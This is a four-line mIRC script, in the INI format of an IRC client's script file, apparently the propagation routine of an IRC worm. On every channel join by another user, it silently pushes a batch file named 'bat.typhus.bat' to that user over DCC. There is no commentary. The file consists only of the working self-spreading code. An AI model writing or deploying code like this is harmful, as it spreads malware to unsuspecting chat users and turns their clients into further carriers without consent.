[script]
n0=on 1:JOIN:#:{ 
n1= /if ( nick == $me ) { halt } 
n2= /.dcc send $nick c:\windows\system\bat.typhus.bat 
n3=} 
